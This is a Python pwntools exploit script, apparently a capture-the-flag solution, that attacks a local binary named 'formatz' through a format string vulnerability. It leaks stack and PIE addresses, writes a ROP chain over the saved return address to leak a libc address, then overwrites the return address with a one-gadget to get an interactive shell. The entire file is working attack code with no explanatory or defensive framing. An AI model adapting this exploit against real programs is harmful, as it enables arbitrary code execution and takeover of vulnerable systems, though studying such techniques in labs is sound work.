# coding: utf-8
from pwn import *
context.arch="amd64"
def exec_fmt(payload):
    p=process("./formatz")
    p.sendline(payload)
    return p.recvall()
autofmt=FmtStr(exec_fmt)
binary=ELF("./formatz")
p=process("./formatz")
resp=p.recv()
addr=re.findall(b"([a-f0-9]{8,16})",resp)
stack_leak=addr[0]
pie_leak=addr[1]
bufflen=0x150
stack_leak=int(stack_leak,16)
pie_leak=int(pie_leak,16)
binary.address = pie_leak-binary.sym.main
target=stack_leak+bufflen+8 #8 is instr pointer
poprdi=0x00000000000012bb
poprdi+=binary.address
offset=autofmt.offset
p.sendline(fmtstr_payload(offset,{target:poprdi, target+8:binary.got['setvbuf'], target+16:binary.sym.puts, target+24: binary.sym.main}, write_size='short'))
sleep(1)
resp=p.recvuntil('\n')
lib_leak=resp[-8:]
from Crypto.Util.number import *
libc=ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.address = bytes_to_long(lib_leak) - libc.symbols.setvbuf
resp=p.recv()
addr=re.findall(b"([a-f0-9]{8,16})",resp)
stack_leak=addr[0]
pie_leak=addr[1]
bufflen=0x150
stack_leak=int(stack_leak,16)
pie_leak=int(pie_leak,16)
binary.address = pie_leak-binary.sym.main
target=stack_leak+bufflen+8 #8 is instr pointer
gadget=libc.address+0xcbd1d
p.sendline(fmtstr_payload(offset,{target:gadget}))
p.interactive()
